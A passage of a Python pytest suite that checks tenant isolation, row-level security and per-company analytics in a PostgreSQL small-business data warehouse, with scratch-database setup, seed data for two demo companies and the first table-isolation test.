"""
QA suite for the MULTI-TENANT layer + Executive PDF Brief -- the isolation
audit for the Fractional CFO deployment of the SMB Financial & Operational
Data Warehouse.

HOW TO RUN
----------
    cd "/Users/Owner/Desktop/GLM-5.3/Data Warehouse"
    python3 -m pytest test_multitenant_pdf.py -v

    (or together with the other suites:
     python3 -m pytest test_schema.py test_predictive.py test_nl_to_sql.py
                        test_socal_fintech.py test_socal_capital.py
                        test_multitenant_pdf.py -q)

SAFETY MODEL (same scratch-DB pattern as test_schema.py / test_predictive.py)
----------------------------------------------------------------------------
The whole suite runs against a THROWAWAY database it creates and drops itself
(smb_warehouse_qa_mt on the same PostgreSQL server) built from schema.sql +
analytics_views.sql + migrations/001 + migrations/002, so nothing here can
ever contaminate the LIVE smb_warehouse. The live database is opened
READ-ONLY in exactly one place (test_J_live_hygiene_probe) to prove the live
deployment itself is still single-tenant-clean.

The session fixture seeds TWO deterministic client workspaces in the scratch
DB and never touches anything else:

  company 1  'BrightPath Works (Demo)'  (schema.sql-seeded, id 1) -- a mini
             dataset: 2 job_types, 3 customers, 2 employees, 6 jobs, 22
             ledger rows, 12 labor logs spanning 6 months (2025-11..2026-05).
  company 2  'QA Client Two' -- distinct data (different job_type name,
             2 customers, 1 employee, 2 jobs, 10 ledger rows incl. a
             materials spike, 2 labor logs). Every company-2 name/value is
             tagged 'QAMT2' and every company-1 fixture value is tagged
             'QAMT1', which doubles as the leak-detection marker for the
             tab-query and PDF isolation assertions.

Live-write guards: the project modules' default DB constants are patched to a
nonexistent guard database, so any engine call that forgets its explicit
scratch connection/URL fails LOUDLY instead of silently writing to the live
warehouse (same pattern as test_predictive.py). Module DB constants are
restored at session teardown.

ISOLATION MATRIX (section -> what is proven)
--------------------------------------------
  A. Table-level isolation
       A1 every client table returns only its company's rows; the whole
          scratch DB holds zero rows outside {company 1, company 2}
       A2 bare INSERT (no company_id) lands in company 1 via DEFAULT 1 --
          the documented legacy-writer trade-off, pinned as-is
       A3 explicit NULL company_id rejected (NOT NULL)
       A4 FK RESTRICT: deleting a company WITH dependent rows fails; an
          EMPTY company deletes fine
       A5 bogus company_id rejected (FK to companies)
  B. Matview isolation (after REFRESH): per-(company) grain + hand-computed
     values for BOTH companies from the seeded data
       B1 mv_job_type_profitability (aggregates never cross companies)
       B2 mv_labor_cost_analysis
       B3 mv_customer_profitability + PER-WORKSPACE whale ranking (company 2
          has a whale measured against ITS OWN tiny book; the same revenue
          would not be a whale under a global percentile)
       B4 mv_monthly_summary -- (company, month) rows for BOTH companies in
          the SAME month
       B5 mv_benchmark_comparison -- internal series per company, market
          columns identical/global
  C. detect_anomalies() per-company correctness (the critical proof)
       C1 company 1 steady ~1000/mo materials, company 2 steady ~200/mo then
          one 800 spike in the SAME category/month -> exactly ONE alert,
          company_id = 2, baseline mean 200.00 / stddev 14.14 computed from
          COMPANY 2's history only. If the baseline mixed companies the mean
          would be ~600+ and the spike would not fire; company 1 raises no
          alert at all.
       C2 the SAME spike planted in BOTH companies -> two alerts, one per
          company, same category+period, no ON CONFLICT collision (the
          per-company partial unique indexes work as designed).
  D. Tab-level isolation
       D1 static audit of app.py: EVERY qdf/qdf_params query that touches
          one of the 8 client tables or the 5 company-scoped matviews
          contains a company_id predicate (zero violations; the exempt
          queries touch only the companies registry or global market tables)
       D2 the same static audit for generate_pdf_brief.py +
          forecast_engine.py + ingest_csv.py writer paths
       D3 dynamic: the EXACT dashboard tab SQL (Overview stats + monthly,
          Charts x4, Alerts, Pricing-simulator prefill, Forecast history +
          forecast table) run against BOTH company ids -- each company sees
          only its own rows (QAMT1/QAMT2 marker leak check)
  E. Workspace creation flow (app.py's real create_workspace + its
     case-insensitive duplicate check; DB-level UNIQUE is case-sensitive --
     pinned honestly as an app-level-guard trade-off)
  F. Ingest isolation: run_ingest(company_id=2) lands rows in company 2,
     company 1 untouched; the default lands in company 1; FK resolution is
     workspace-scoped (a company-2 ingest cannot resolve company 1's
     customer by name)
  G. Forecast isolation: run_forecasts(company_id=2) writes company-2 rows
     only; company 1's rows (from run_forecasts(company_id=1)) are
     untouched; the (company_id, series, period_start, model) upsert key
     does not collide across companies
  H. PDF isolation: generate_pdf_brief() for both companies -- %PDF magic,
     pypdf text extraction proves company 1's brief contains ONLY
     'BrightPath Works (Demo)' and company 2's ONLY 'QA Client Two'; bytes
     differ; unknown/None company_id degrades gracefully (pinned behavior)
  I. nl_to_sql multi-tenant: the 27-relation allowlist contains companies
     and the 5 scoped_* wrapper views (the raw mv_* names are gone);
     mocked-chat ask() with company_id=co2 returns only company-2 rows --
     DATABASE-ENFORCED via row-level security (the restricted nl2sql_reader
     role + the app.current_company_id GUC set by run_readonly_query, so an
     UNscoped SELECT is scoped too and company_id=None fail-closes to zero
     rows); the workspace-context line the app appends is pinned
  K. RLS enforcement proofs via the restricted role (migrations/002 applied
     to the scratch DB): the migration's role attributes + 9 policies +
     grant matrix incl. negative checks; with the GUC set to company 2 the
     role sees ONLY company-2 rows; SELECT ... WHERE company_id=1 returns 0
     (RLS ANDs with the caller's WHERE); no GUC -> 0 rows (fail-closed);
     scoped views -> only own rows; raw matview SELECT -> permission denied;
     UPDATE/DELETE via the role -> blocked with zero rows changed.
     K10-K17 (RLS-round audit additions): the parametrized DEMANDED PROOF
     (bare SELECT *, no WHERE, per relation x both directions incl. the
     companies registry and the 5 scoped views); the adversarial leak
     battery (equality/IN/catch-all/UNION/subquery); the parametrized
     no-GUC fail-closed sweep; GUC manipulation forensics ('abc' -> clean
     22P02 cast error, '' -> 0 rows, overflow -> 22003, RESET/rollback,
     SET LOCAL inside a read-only txn still enforced); the AI-vector
     bypass battery (every parser-rejected attack never executes through
     the ask() pipeline + the executor's DB-level fate for each, honestly
     pinned); write-layer forensics (grants fire first, read-only txn
     fires first, and RLS WITH CHECK still blocks a cross-tenant hijack
     even when the role's grants are deliberately widened on the scratch
     DB); timeout + read-only re-proofs through run_readonly_query; and
     the residual-visibility honesty table (what the role can see WITHOUT
     a GUC) -- the documented threat-model boundary.
  J. Live-DB hygiene probe (READ-ONLY): companies == 1, the 12 documented
     baseline counts intact, and ZERO rows with company_id <> 1 (or NULL) in
     the 8 client tables on the LIVE warehouse.
  Final: scratch-DB residue check (only the two intentional workspaces and
  their seeded data remain).

Connection: DATABASE_URL only selects the PARENT database from which the
throwaway is derived (default: the maintenance DB 'postgres' on localhost).
The suite itself always runs against smb_warehouse_qa_mt.
"""

import ast
import datetime
import io
import os
import shutil
import subprocess
import sys
import time
import urllib.parse
import uuid
from decimal import Decimal

import psycopg2
import psycopg2.errors
import pytest

_BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, _BASE_DIR)  # project-local imports (patched modules below)

DATABASE_URL = os.environ.get(
    "DATABASE_URL",
    "postgresql://postgres:postgres@localhost:5432/postgres",
)

SCRATCH_DB_NAME = "smb_warehouse_qa_mt"
LIVE_WAREHOUSE_URL = ("postgresql://postgres:postgres@localhost:5432/"
                      "smb_warehouse")
# Any module-level default DB the engines fall back to is pointed here in a
# session fixture, so a forgotten explicit connection fails LOUDLY.
_GUARD_DB = ("postgresql://postgres:postgres@localhost:5432/"
             "qa_mt_guard_db_does_not_exist")

SCHEMA_SQL_PATH = os.path.join(_BASE_DIR, "schema.sql")
ANALYTICS_VIEWS_SQL_PATH = os.path.join(_BASE_DIR, "analytics_views.sql")
MIGRATION_001_PATH = os.path.join(_BASE_DIR, "migrations",
                                  "001_add_companies.sql")
MIGRATION_002_PATH = os.path.join(_BASE_DIR, "migrations", "002_add_rls.sql")
APP_PATH = os.path.join(_BASE_DIR, "app.py")
PSQL_BIN = shutil.which("psql") or "/Users/Owner/pg/bin/psql"

APP_PY_SOURCE = None  # loaded once (test_D1_static_audit_app_sql)

import forecast_engine as fe          # noqa: E402
import generate_pdf_brief as gpdf     # noqa: E402
import ingest_csv                     # noqa: E402
import nl_to_sql                      # noqa: E402

# The 8 client-data tables scoped by company_id (migration 001).
CLIENT_TABLES = (
    "customers", "job_types", "employees", "jobs",
    "financial_ledger", "labor_logs", "anomaly_alerts", "forecasts",
)
# The company-scoped materialized views (mv_socal_rate_guidance is GLOBAL by
# design and carries no company_id).
SCOPED_MATVIEWS = (
    "mv_monthly_summary", "mv_customer_profitability",
    "mv_job_type_profitability", "mv_labor_cost_analysis",
    "mv_benchmark_comparison",
)

# Documented LIVE-warehouse baseline (must be unchanged by this suite -- see
# test_J_live_hygiene_probe).
LIVE_BASELINE = {
    "jobs": 2502,
    "anomaly_alerts": 71,
    "anomaly_alerts_open": 71,
    "whales": 5,
    "market_benchmarks": 864,
    "financial_ledger": 6373,
    "labor_logs": 18504,
    "forecasts": 12,
    "backtest_results": 4,
    "customers": 150,
    "employees": 20,
    "job_types": 8,
}

DEMO_COMPANY_NAME = "BrightPath Works (Demo)"
CO2_NAME = "QA Client Two"


def norm_sql(text):
    """Collapse whitespace so SQL transcribed from app.py can be pinned
    against the app's source as a normalized substring."""
    return " ".join(str(text).split())


# ---------------------------------------------------------------------------
# Session state (two seeded workspaces + their ids)
# ---------------------------------------------------------------------------
SESSION = {
    "co1": 1,               # schema.sql seeds the demo workspace as id 1
    "co2": None,            # 'QA Client Two' (id captured at seed time)
}


# ---------------------------------------------------------------------------
# Scratch database lifecycle (identical pattern to test_schema.py)
# ---------------------------------------------------------------------------
def scratch_database_url():
    parts = urllib.parse.urlsplit(DATABASE_URL)
    return urllib.parse.urlunsplit(
        (parts.scheme, parts.netloc, "/" + SCRATCH_DB_NAME, parts.query,
         parts.fragment)
    )


def _parent_connect():
    conn_ = psycopg2.connect(DATABASE_URL)
    conn_.autocommit = True   # CREATE/DROP DATABASE cannot run in a txn block
    return conn_


def drop_scratch_database(scratch_url):
    conn_ = _parent_connect()
    try:
        with conn_.cursor() as cur:
            cur.execute(f"DROP DATABASE IF EXISTS {SCRATCH_DB_NAME} WITH (FORCE)")
    finally:
        conn_.close()


def create_scratch_database():
    conn_ = _parent_connect()
    try:
        with conn_.cursor() as cur:
            cur.execute(f"CREATE DATABASE {SCRATCH_DB_NAME}")
    finally:
        conn_.close()


def apply_sql_file(scratch_url, path):
    if not os.path.isfile(path):
        pytest.fail(f"SQL file not found: {path}", pytrace=False)
    proc = subprocess.run(
        [PSQL_BIN, scratch_url, "-X", "-v", "ON_ERROR_STOP=1", "-f", path],
        capture_output=True, text=True, timeout=180,
    )
    if proc.returncode != 0:
        pytest.fail(
            f"psql failed applying {os.path.basename(path)} to"
            f" {SCRATCH_DB_NAME} (exit code {proc.returncode}):\n"
            f"--- psql stdout ---\n{proc.stdout}\n"
            f"--- psql stderr ---\n{proc.stderr}",
            pytrace=False,
        )


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def fetch_all(conn, sql, params=None):
    with conn.cursor() as cur:
        cur.execute(sql, params)
        return cur.fetchall()


def fetch_one(conn, sql, params=None):
    return fetch_all(conn, sql, params)[0]


def fetch_dicts(conn, sql, params=None):
    with conn.cursor() as cur:
        cur.execute(sql, params)
        cols = [d[0] for d in cur.description]
        return [dict(zip(cols, r)) for r in cur.fetchall()]


def rows_to_text(rows):
    """Serialize query rows for the QAMT1/QAMT2 leak check (numbers, dates
    and names all reduce to text)."""
    out = []
    for row in rows:
        for cell in row:
            out.append(str(cell))
    return "\n".join(out)


def refresh_analytics(conn):
    with conn.cursor() as cur:
        cur.execute("SELECT refresh_all_analytics()")
    conn.commit()


# ---------------------------------------------------------------------------
# deterministic two-company dataset
# ---------------------------------------------------------------------------
def _seed_company1(conn, co1):
    """Mini demo dataset: 2 job_types, 3 customers, 2 employees, 6 jobs,
    22 ledger rows (steady ~1000/mo materials + revenue + steady rent +
    constant payroll), 12 labor logs spanning 2025-12..2026-05.

    DESIGN CONSTRAINTS (documented in the docstring):
      * every expense category is STEADY so detect_anomalies() raises ZERO
        alerts for company 1 (labor logs stay under estimated_labor_cost too);
      * materials are job-attributed so the per-type / per-customer roll-ups
        are hand-computable;
      * the payroll category is deliberately CONSTANT to exercise the
        detector's stddev = 0 guard.
    """
    with conn.cursor() as cur:
        # job_types (2)
        cur.execute(
            "INSERT INTO job_types (company_id, name, default_hourly_rate,"
            " typical_duration_hours) VALUES (%s, %s, %s, %s) RETURNING id",
            (co1, "QAMT1 Roofing Services", 60.00, 8.00))
        jt_roof = cur.fetchone()[0]
        cur.execute(
            "INSERT INTO job_types (company_id, name, default_hourly_rate,"
            " typical_duration_hours) VALUES (%s, %s, %s, %s) RETURNING id",
            (co1, "QAMT1 Interior Painting", 45.00, 6.00))
        jt_paint = cur.fetchone()[0]

        # customers (3)
        for name, email, since in (
                ("QAMT1 Alpha Holdings", "qamt1.alpha@example.test",
                 datetime.date(2025, 11, 5)),
                ("QAMT1 Beta Ventures", "qamt1.beta@example.test",
                 datetime.date(2026, 1, 20)),
                ("QAMT1 Gamma Trading", "qamt1.gamma@example.test",
                 datetime.date(2026, 3, 2))):
            cur.execute(
                "INSERT INTO customers (company_id, name, email, city,"
                " customer_since) VALUES (%s, %s, %s, %s, %s) RETURNING id",
                (co1, name, email, "QA Springs", since))
        cur.execute(
            "SELECT id, name FROM customers WHERE company_id = %s"
            " ORDER BY id", (co1,))
        cust = {name: cid for cid, name in cur.fetchall()}

        # employees (2)
        cur.execute(
            "INSERT INTO employees (company_id, first_name, last_name, email,"
            " hire_date, hourly_rate) VALUES (%s, %s, %s, %s, %s, %s)"
            " RETURNING id",
            (co1, "QA", "CrewOne", "qamt1.alice@example.test",
             datetime.date(2024, 1, 15), 50.00))
        alice = cur.fetchone()[0]
        cur.execute(
            "INSERT INTO employees (company_id, first_name, last_name, email,"
            " hire_date, hourly_rate) VALUES (%s, %s, %s, %s, %s, %s)"
            " RETURNING id",
            (co1, "QA", "Fielder", "qamt1.bob@example.test",
             datetime.date(2024, 3, 1), 40.00))
        bob = cur.fetchone()[0]

        # jobs (6)
        jobs_spec = [
            ("QAMT1-JOB-001", "QAMT1 Alpha Holdings", jt_roof,
             datetime.date(2025, 12, 10), 9000.00, 1200.00,
             "completed", datetime.date(2025, 12, 20)),
            ("QAMT1-JOB-002", "QAMT1 Alpha Holdings", jt_paint,
             datetime.date(2026, 1, 15), 4000.00, 600.00,
             "in_progress", None),
            ("QAMT1-JOB-003", "QAMT1 Beta Ventures", jt_roof,
             datetime.date(2026, 2, 10), 12000.00, 2000.00,
             "completed", datetime.date(2026, 2, 20)),
            ("QAMT1-JOB-004", "QAMT1 Beta Ventures", jt_paint,
             datetime.date(2026, 3, 5), 3000.00, 500.00,
             "quoted", None),
            ("QAMT1-JOB-005", "QAMT1 Gamma Trading", jt_roof,
             datetime.date(2026, 4, 12), 7000.00, 900.00,
             "completed", datetime.date(2026, 4, 25)),
            ("QAMT1-JOB-006", "QAMT1 Gamma Trading", jt_paint,
             datetime.date(2026, 5, 8), 2500.00, 400.00,
             "completed", datetime.date(2026, 5, 18)),
        ]
        job_ids = {}
        for number, cust_name, jtid, jdate, quote, est, status, cdate in jobs_spec:
            cur.execute(
                "INSERT INTO jobs (company_id, job_number, customer_id,"
                " job_type_id, status, job_date, completion_date, quoted_price,"
                " estimated_labor_cost) VALUES (%s, %s, %s, %s, %s, %s, %s,"
                " %s, %s) RETURNING id",
                (co1, number, cust[cust_name], jtid, status, jdate, cdate,
                 quote, est))
            job_ids[number] = cur.fetchone()[0]

        # labor logs (12): J1 22h/$1000, J2 11h/$520, J3 28h/$1280,
        #                  J4 8h/$340,  J5 18h/$820,  J6 9h/$400
        logs_spec = [
            ("QAMT1-JOB-001", alice, datetime.date(2025, 12, 12), 12.00, 50.00),
            ("QAMT1-JOB-001", bob,   datetime.date(2025, 12, 14), 10.00, 40.00),
            ("QAMT1-JOB-002", alice, datetime.date(2026, 1, 18),  8.00, 50.00),
            ("QAMT1-JOB-002", bob,   datetime.date(2026, 1, 20),  3.00, 40.00),
            ("QAMT1-JOB-003", alice, datetime.date(2026, 2, 12), 16.00, 50.00),
            ("QAMT1-JOB-003", bob,   datetime.date(2026, 2, 15), 12.00, 40.00),
            ("QAMT1-JOB-004", bob,   datetime.date(2026, 3, 8),   6.00, 40.00),
            ("QAMT1-JOB-004", alice, datetime.date(2026, 3, 10),  2.00, 50.00),
            ("QAMT1-JOB-005", alice, datetime.date(2026, 4, 14), 10.00, 50.00),
            ("QAMT1-JOB-005", bob,   datetime.date(2026, 4, 16),  8.00, 40.00),
            ("QAMT1-JOB-006", bob,   datetime.date(2026, 5, 10),  5.00, 40.00),
            ("QAMT1-JOB-006", alice, datetime.date(2026, 5, 11),  4.00, 50.00),
        ]
        for number, emp, day, hours, rate in logs_spec:
            cur.execute(
                "INSERT INTO labor_logs (company_id, job_id, employee_id,"
                " work_date, hours, hourly_rate) VALUES (%s, %s, %s, %s, %s, %s)",
                (co1, job_ids[number], emp, day, hours, rate))

        # ledger (22)
        ledger_spec = [
            # materials, job-attributed, one row per month (steady ~1000/mo):
            ("QAMT1-JOB-001", None, "expense", "materials",
             datetime.date(2025, 12, 15), 950.00),
            ("QAMT1-JOB-002", None, "expense", "materials",
             datetime.date(2026, 1, 16), 1050.00),
            ("QAMT1-JOB-003", None, "expense", "materials",
             datetime.date(2026, 2, 14), 1000.00),
            ("QAMT1-JOB-004", None, "expense", "materials",
             datetime.date(2026, 3, 9), 980.00),
            ("QAMT1-JOB-005", None, "expense", "materials",
             datetime.date(2026, 4, 15), 1020.00),
            ("QAMT1-JOB-006", None, "expense", "materials",
             datetime.date(2026, 5, 12), 1000.00),
            # revenue (the source of truth):
            ("QAMT1-JOB-001", None, "revenue", "QAMT1 contract revenue",
             datetime.date(2025, 12, 22), 9000.00),
            ("QAMT1-JOB-003", None, "revenue", "QAMT1 contract revenue",
             datetime.date(2026, 2, 22), 12000.00),
            ("QAMT1-JOB-005", None, "revenue", "QAMT1 contract revenue",
             datetime.date(2026, 4, 26), 7000.00),
            ("QAMT1-JOB-006", None, "revenue", "QAMT1 contract revenue",
             datetime.date(2026, 5, 20), 2500.00),
            # rent overhead (steady):
            (None, None, "expense", "rent",
             datetime.date(2025, 12, 1), 500.00),
            (None, None, "expense", "rent",
             datetime.date(2026, 1, 1), 500.00),
            (None, None, "expense", "rent",
             datetime.date(2026, 2, 1), 520.00),
            (None, None, "expense", "rent",
             datetime.date(2026, 3, 1), 510.00),
            (None, None, "expense", "rent",
             datetime.date(2026, 4, 1), 490.00),
            (None, None, "expense", "rent",
             datetime.date(2026, 5, 1), 500.00),
            # payroll recharges (CONSTANT -> the detector's stddev=0 guard):
            (None, None, "expense", "labor",
             datetime.date(2025, 12, 1), 600.00),
            (None, None, "expense", "labor",
             datetime.date(2026, 1, 1), 600.00),
            (None, None, "expense", "labor",
             datetime.date(2026, 2, 1), 600.00),
            (None, None, "expense", "labor",
             datetime.date(2026, 3, 1), 600.00),
            (None, None, "expense", "labor",
             datetime.date(2026, 4, 1), 600.00),
            (None, None, "expense", "labor",
             datetime.date(2026, 5, 1), 600.00),
        ]
        for number, cust_id, etype, cat, day, amount in ledger_spec:
            cur.execute(
                "INSERT INTO financial_ledger (company_id, job_id, customer_id,"
                " entry_type, category, entry_date, amount, vendor)"
                " VALUES (%s, %s, %s, %s, %s, %s, %s, %s)",
                (co1, job_ids[number] if number else None, cust_id, etype, cat,
                 day, amount, "QAMT1-vendor"))
    conn.commit()


def _seed_company2(conn, co2):
    """'QA Client Two': different job_type name, 2 customers, 1 employee,
    2 jobs, 10 ledger rows, 2 labor logs.

    Detector design: materials history Nov 2025..Apr 2026 is STEADY
    (180, 220, 190, 210, 200, 200 -> mean 200.00, STDDEV_SAMP = sqrt(200)
    = 14.14) and May 2026 spikes to 800 -> z = 42.43 -> the ONE alert. The
    extra acquisition-cost row (Delta, 4500) is a single-month category
    whose later months sit far BELOW the rolling mean, so it never fires.
    Delta's acquisition cost also makes Delta a whale against COMPANY 2'S
    OWN p80 (= 4700.00); the same revenue would NOT be a whale under a
    global percentile (= 10000.00) -- the per-workspace whale proof.
    """
    with conn.cursor() as cur:
        cur.execute(
            "INSERT INTO job_types (company_id, name, default_hourly_rate,"
            " typical_duration_hours) VALUES (%s, %s, %s, %s) RETURNING id",
            (co2, "QAMT2 Digital Marketing Retainer", 95.00, 10.00))
        jt2 = cur.fetchone()[0]

        for name, email, since in (
                ("QAMT2 Delta Group", "qamt2.delta@example.test",
                 datetime.date(2026, 1, 10)),
                ("QAMT2 Epsilon Labs", "qamt2.epsilon@example.test",
                 datetime.date(2026, 3, 15))):
            cur.execute(
                "INSERT INTO customers (company_id, name, email, city,"
                " customer_since) VALUES (%s, %s, %s, %s, %s) RETURNING id",
                (co2, name, email, "QA Metro", since))
        cur.execute(
            "SELECT id, name FROM customers WHERE company_id = %s"
            " ORDER BY id", (co2,))
        cust = {name: cid for cid, name in cur.fetchall()}

        cur.execute(
            "INSERT INTO employees (company_id, first_name, last_name, email,"
            " hire_date, hourly_rate) VALUES (%s, %s, %s, %s, %s, %s)"
            " RETURNING id",
            (co2, "QA", "Analyst", "qamt2.carol@example.test",
             datetime.date(2024, 6, 1), 85.00))
        carol = cur.fetchone()[0]

        cur.execute(
            "INSERT INTO jobs (company_id, job_number, customer_id,"
            " job_type_id, status, job_date, completion_date, quoted_price,"
            " estimated_labor_cost) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)"
            " RETURNING id",
            (co2, "QAMT2-JOB-001", cust["QAMT2 Delta Group"], jt2,
             "completed", datetime.date(2026, 2, 5),
             datetime.date(2026, 2, 28), 5000.00, 1000.00))
        k1 = cur.fetchone()[0]
        cur.execute(
            "INSERT INTO jobs (company_id, job_number, customer_id,"
            " job_type_id, status, job_date, completion_date, quoted_price,"
            " estimated_labor_cost) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)"
            " RETURNING id",
            (co2, "QAMT2-JOB-002", cust["QAMT2 Epsilon Labs"], jt2,
             "completed", datetime.date(2026, 4, 5),
             datetime.date(2026, 4, 30), 3500.00, 700.00))
        k2 = cur.fetchone()[0]

        # labor logs: K1 8h/$680, K2 6h/$510 (both under estimate -> no overrun)
        for jid, day, hours, rate in (
                (k1, datetime.date(2026, 2, 10), 8.00, 85.00),
                (k2, datetime.date(2026, 4, 12), 6.00, 85.00)):
            cur.execute(
                "INSERT INTO labor_logs (company_id, job_id, employee_id,"
                " work_date, hours, hourly_rate) VALUES (%s, %s, %s, %s, %s, %s)",
                (co2, jid, carol, day, hours, rate))

        # ledger (10)
        ledger_spec = [
            # materials: 6 steady months (mean 200, stddev 14.14) + ONE spike
            (k1, None, "expense", "materials", datetime.date(2025, 11, 20), 180.00),
            (k1, None, "expense", "materials", datetime.date(2025, 12, 20), 220.00),
            (k1, None, "expense", "materials", datetime.date(2026, 1, 20), 190.00),
            (k1, None, "expense", "materials", datetime.date(2026, 2, 20), 210.00),
            (k2, None, "expense", "materials", datetime.date(2026, 3, 20), 200.00),
            (k2, None, "expense", "materials", datetime.date(2026, 4, 20), 200.00),
            (k2, None, "expense", "materials", datetime.date(2026, 5, 20), 800.00),
            # revenue:
            (k1, None, "revenue", "QAMT2 retainer revenue",
             datetime.date(2026, 3, 1), 5000.00),
            (k2, None, "revenue", "QAMT2 retainer revenue",
             datetime.date(2026, 4, 28), 3500.00),
            # customer-attributed acquisition cost (no job behind it):
            (None, cust["QAMT2 Delta Group"], "expense", "QAMT2 acquisition",
             datetime.date(2026, 2, 15), 4500.00),
        ]
        for jid, cust_id, etype, cat, day, amount in ledger_spec:
            cur.execute(
                "INSERT INTO financial_ledger (company_id, job_id, customer_id,"
                " entry_type, category, entry_date, amount, vendor)"
                " VALUES (%s, %s, %s, %s, %s, %s, %s, %s)",
                (co2, jid, cust_id, etype, cat, day, amount, "QAMT2-vendor"))
    conn.commit()


def _seed_market_macros(conn):
    """GLOBAL market rows (18 months x 5 pinned series) so
    mv_benchmark_comparison's market columns are populated and provably
    identical across workspaces while its internal columns differ.
    Values are deterministic: wage 30+i / 28+i, PPIs 100+i / 110+i / 120+i
    (i = month index from 2024-12)."""
    months = []
    y, m = 2024, 12
    for _ in range(18):
        months.append(datetime.date(y, m, 1))
        m += 1
        if m > 12:
            y, m = y + 1, 1
    series = [
        ("CES2000000003", "us-national", "wage", 30.00),
        ("SMU29000002000000003", "us-mo", "wage", 28.00),
        ("WPU0822", "us-national", "ppi", 100.00),
        ("PCU325510325510", "us-national", "ppi", 110.00),
        ("WPUSI012011", "us-national", "ppi", 120.00),
    ]
    with conn.cursor() as cur:
        for sid, region, kind, base in series:
            for i, period in enumerate(months):
                cur.execute(
                    "INSERT INTO market_benchmarks (job_type_id, period,"
                    " region, benchmark_kind, series_id, avg_price,"
                    " avg_labor_cost_per_job, avg_margin_pct, source)"
                    " VALUES (NULL, %s, %s, %s, %s, %s, 0, 0, %s)",
                    (period, region, kind, sid, base + i, "QAMT fixture"))
    conn.commit()


# ---------------------------------------------------------------------------
# session fixtures
# ---------------------------------------------------------------------------
@pytest.fixture(scope="session")
def conn():
    """Session-scoped connection to the THROWAWAY scratch database
    smb_warehouse_qa_mt, seeded with TWO deterministic client workspaces.
    Teardown (even on failure) drops the whole database: the live
    smb_warehouse is never touched by this suite."""
    scratch_url = scratch_database_url()
    _conn = None
    try:
        drop_scratch_database(scratch_url)
        create_scratch_database()
        apply_sql_file(scratch_url, SCHEMA_SQL_PATH)
        apply_sql_file(scratch_url, ANALYTICS_VIEWS_SQL_PATH)
        # The multi-tenant migrations, in the same order the Docker
        # init_pipeline applies them (schema files FIRST, then migrations):
        # 001 (companies registry -- idempotent no-op on schema.sql's new
        # shape) and 002 (nl2sql_reader role + RLS policies + scoped_*
        # wrapper views + grants). RLS therefore ENFORCES on this scratch
        # DB for the restricted-role session proofs in section K; the
        # suite's own connections stay postgres (superuser -> bypasses RLS
        # by design).
        apply_sql_file(scratch_url, MIGRATION_001_PATH)
        apply_sql_file(scratch_url, MIGRATION_002_PATH)
        _conn = psycopg2.connect(scratch_url)
        _conn.autocommit = False

        # schema.sql seeds the demo workspace as company #1 (the DEFAULT 1
        # parent). 'QA Client Two' becomes company #2 via the identity.
        with _conn.cursor() as cur:
            cur.execute(
                "SELECT company_name FROM companies WHERE company_id = 1")
            row = cur.fetchone()
            assert row is not None and row[0] == DEMO_COMPANY_NAME, (
                f"schema.sql must seed '{DEMO_COMPANY_NAME}' as company 1;"
                f" got {row!r}")
            SESSION["co1"] = 1
            cur.execute(
                "INSERT INTO companies (company_name, industry_vertical,"
                " socal_region) VALUES (%s, %s, %s) RETURNING company_id",
                (CO2_NAME, "software_consulting", "la_msa"))
            SESSION["co2"] = cur.fetchone()[0]
            assert SESSION["co2"] != SESSION["co1"]
        _conn.commit()

        _seed_company1(_conn, SESSION["co1"])
        _seed_company2(_conn, SESSION["co2"])
        _seed_market_macros(_conn)
        refresh_analytics(_conn)   # matviews now hold BOTH workspaces' rows
        yield _conn
    finally:
        if _conn is not None:
            try:
                _conn.close()
            except Exception:      # pragma: no cover - backstop
                pass
        try:
            drop_scratch_database(scratch_url)
        except Exception as exc:   # pragma: no cover - backstop
            print(f"WARNING: could not drop scratch database"
                  f" {SCRATCH_DB_NAME}: {exc!r}")


# Saved module DB defaults (populated by _engine_db_guards). The AppTest
# render test temporarily restores them: app.py uses the modules' DEFAULT
# connections legitimately (Overview's cached PDF brief), so the guard must
# be lifted for the in-process render and re-applied afterwards.
_SAVED_MODULE_DBS = {}


@pytest.fixture(scope="module", autouse=True)
def _engine_db_guards():
    """Point every engine module's default DB at a nonexistent guard
    database: any code path that forgets its explicit scratch
    connection/db argument fails LOUDLY instead of silently writing to the
    live smb_warehouse (test_predictive.py's pattern). Restored afterwards
    so other suites in one pytest process are unaffected."""
    _SAVED_MODULE_DBS.update({
        "fe.DB": fe.DB,
        "gpdf.DB": gpdf.DB,
        "ingest_csv.DB": ingest_csv.DB,
        "nl_to_sql.DB_URL": nl_to_sql.DB_URL,
    })
    fe.DB = _GUARD_DB
    gpdf.DB = _GUARD_DB
    ingest_csv.DB = _GUARD_DB
    nl_to_sql.DB_URL = _GUARD_DB
    yield
    fe.DB = _SAVED_MODULE_DBS["fe.DB"]
    gpdf.DB = _SAVED_MODULE_DBS["gpdf.DB"]
    ingest_csv.DB = _SAVED_MODULE_DBS["ingest_csv.DB"]
    nl_to_sql.DB_URL = _SAVED_MODULE_DBS["nl_to_sql.DB_URL"]


# ===========================================================================
# A) Table-level isolation
# ===========================================================================
# Seeded per-company row counts (the base dataset; mutating tests clean up
# after themselves so these hold at any point in the suite).
SEED_COUNTS_CO1 = {
    "customers": 3, "job_types": 2, "employees": 2, "jobs": 6,
    "financial_ledger": 22, "labor_logs": 12,
}
SEED_COUNTS_CO2 = {
    "customers": 2, "job_types": 1, "employees": 1, "jobs": 2,
    "financial_ledger": 10, "labor_logs": 2,
}


def test_A1_table_isolation_matrix(conn):
    """Every client table returns only its company's rows when filtered by
    company_id, and the scratch DB holds ZERO rows outside the two seeded
    workspaces (no unscoped / orphan rows anywhere)."""
    co1, co2 = SESSION["co1"], SESSION["co2"]
    for table in CLIENT_TABLES[:6]:
        n1, n2 = SEED_COUNTS_CO1[table], SEED_COUNTS_CO2[table]
        (got1,) = fetch_one(conn, f"SELECT COUNT(*) FROM {table}"
                                  " WHERE company_id = %s", (co1,))
        (got2,) = fetch_one(conn, f"SELECT COUNT(*) FROM {table}"
                                  " WHERE company_id = %s", (co2,))
        (total,) = fetch_one(conn, f"SELECT COUNT(*) FROM {table}")
        assert got1 == n1, f"{table}: company 1 expected {n1}, got {got1}"
        assert got2 == n2, f"{table}: company 2 expected {n2}, got {got2}"
        assert total == n1 + n2, (
            f"{table}: {total} rows exist but only {n1 + n2} belong to a"
            f" seeded workspace (unscoped/orphan rows!)")
